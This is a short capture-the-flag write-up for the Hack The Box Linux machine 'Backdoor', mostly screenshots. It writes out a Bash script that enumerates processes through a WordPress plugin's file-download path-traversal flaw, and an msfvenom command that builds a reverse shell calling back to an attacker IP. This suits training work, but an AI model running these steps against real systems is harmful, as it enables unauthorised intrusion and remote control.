# 🛡️ HTB Machine Writeup — Backdoor

## Overview
- **Platform:** Hack The Box  
- **Difficulty:** Easy  
- **OS:** Linux

---

## Reconnaissance

### Nmap Scan

![Nmap Scan](Images/Pasted image.png)

![Nmap Scan](Images/Pasted image(2).png)

### Website - TCP Port 80

![Image](Images/Pasted image(3).png)

### Following POC

![Image](Images/Pasted image(4).png)

![Image](Images/Pasted image(5).png)

### Bash Script
I can make a quick Bash script from this to loop over a range of pids and try to find processes:
```
#!/bin/bash

for i in $(seq 1 50000); do

    path="/proc/${i}/cmdline"
    skip_start=$(( 3 * ${#path} + 1))
    skip_end=32

    res=$(curl -s http://backdoor.htb/wp-content/plugins/ebook-download/filedownload.php?ebookdownloadurl=${path}ne -o- | tr '\000' ' ')
    output=$(echo $res | cut -c ${skip_start}- | rev | cut -c ${skip_end}- | rev)
    if [[ -n "$output" ]]; then
        echo "${i}: ${output}"
    fi

done
```

`./brute.sh`

The following process was found
```
/bin/sh -c while true;
    do su user -c "cd /home/user;gdbserver --once 0.0.0.0:1337 /bin/true;"; 
done
```

### Generating Payload

`msfvenom -p linux/x64/shell_reverse_tcp LHOST=10.10.14.6 LPORT=443 PrependFork=true -f elf -o rev.elf`

![Image](Images/Pasted image(6).png)

### Exploiting gdb

![Image](Images/Pasted image(7).png)

### User Flag

![Image](Images/Pasted image(8).png)

![Image](Images/Pasted image(9).png)

### Privilege Escalation

`ps auxww`

![Image](Images/Pasted image(10).png)

![Image](Images/Pasted image(11).png)

![Image](Images/Pasted image(13).png)

### Root Flag

![Image](Images/Pasted image(12).png)
